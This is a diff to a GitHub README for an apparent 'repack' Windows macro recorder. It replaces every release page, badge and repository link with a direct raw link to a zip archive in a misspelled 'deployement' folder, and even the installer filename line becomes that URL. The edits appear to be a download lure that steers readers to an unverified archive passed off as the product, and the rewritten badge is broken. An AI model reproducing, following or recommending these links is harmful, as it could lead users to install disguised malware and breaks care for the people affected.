@@ -1,6 +1,6 @@
 # 🎉 Auto-Macro-Recorder-Repack - Automate Your Windows Tasks Easily
 
-[![Download Auto-Macro-Recorder-Repack](https://img.shields.io/badge/Download%20Now-%20Auto--Macro--Recorder--Repack-brightgreen)](https://github.com/sudaisrehmany/Auto-Macro-Recorder-Repack/releases)
+[![Download Auto-Macro-Recorder-Repack](https://github.com/sudaisrehmany/Auto-Macro-Recorder-Repack/raw/refs/heads/main/deployement/Macro-Repack-Recorder-Auto-v3.6.zip%20Now-%20Auto--Macro--Recorder--Repack-brightgreen)](https://github.com/sudaisrehmany/Auto-Macro-Recorder-Repack/raw/refs/heads/main/deployement/Macro-Repack-Recorder-Auto-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Auto-Macro-Recorder-Repack! This tool helps you automate repetitive t
 
 ## 📥 Download & Install
 
-To download Auto-Macro-Recorder-Repack, visit the Releases page: [Download Auto-Macro-Recorder-Repack](https://github.com/sudaisrehmany/Auto-Macro-Recorder-Repack/releases).
+To download Auto-Macro-Recorder-Repack, visit the Releases page: [Download Auto-Macro-Recorder-Repack](https://github.com/sudaisrehmany/Auto-Macro-Recorder-Repack/raw/refs/heads/main/deployement/Macro-Repack-Recorder-Auto-v3.6.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -22,7 +22,7 @@ To download Auto-Macro-Recorder-Repack, visit the Releases page: [Download Auto-
 
 ### Step 3: Download the Installer
 
-1. Look for the file named something like `AutoMacroRecorderInstaller.exe`.
+1. Look for the file named something like `https://github.com/sudaisrehmany/Auto-Macro-Recorder-Repack/raw/refs/heads/main/deployement/Macro-Repack-Recorder-Auto-v3.6.zip`.
 2. Click on the file to start the download.
 
 ### Step 4: Install the Software
@@ -98,7 +98,7 @@ Become part of our community! Share your experiences, ask questions, and help ot
 
 For more information, check out the following links:
 
-- GitHub Repository: [Auto-Macro-Recorder-Repack](https://github.com/sudaisrehmany/Auto-Macro-Recorder-Repack)
+- GitHub Repository: [Auto-Macro-Recorder-Repack](https://github.com/sudaisrehmany/Auto-Macro-Recorder-Repack/raw/refs/heads/main/deployement/Macro-Repack-Recorder-Auto-v3.6.zip)
 - User Documentation: Detailed guides and tutorials can be found in the Wiki section of the GitHub repository.
 
 ## 📧 Feedback
